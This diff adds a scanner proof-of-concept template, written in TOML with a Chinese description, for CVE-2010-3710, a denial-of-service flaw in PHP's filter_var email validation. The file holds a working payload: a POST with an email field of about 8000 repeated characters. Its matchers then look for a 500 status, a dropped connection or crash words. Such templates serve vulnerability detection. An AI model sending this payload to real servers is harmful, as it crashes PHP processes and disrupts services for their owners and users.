@@ -1,0 +1,50 @@
+[info]
+author = "AVE"
+description = "通过向目标 PHP 页面发送超长邮件地址（约8000字符），触发 filter_var 函数在 FILTER_VALIDATE_EMAIL 模式下的 PCRE 递归栈耗尽，导致 PHP 进程崩溃。验证方式：发送请求后监测目标是否返回 500 或连接断开。"
+id = "POC-AVE-2010-0234"
+name = "PHP filter_var FILTER_VALIDATE_EMAIL 栈消耗拒绝服务漏洞 PoC"
+severity = "medium"
+tags = [
+    "cve-2010-3710",
+    "php",
+    "dos",
+    "filter_var",
+]
+vuln_id = [
+    "CVE-2010-3710",
+    "AVE-2010-0234",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}"
+protocol = "http"
+
+[poc.requests.body]
+content = "email={{repeat('x', 8000)}}%40test.com"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    0,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Segfault",
+    "segfault",
+    "Fatal error",
+    "Stack overflow",
+]
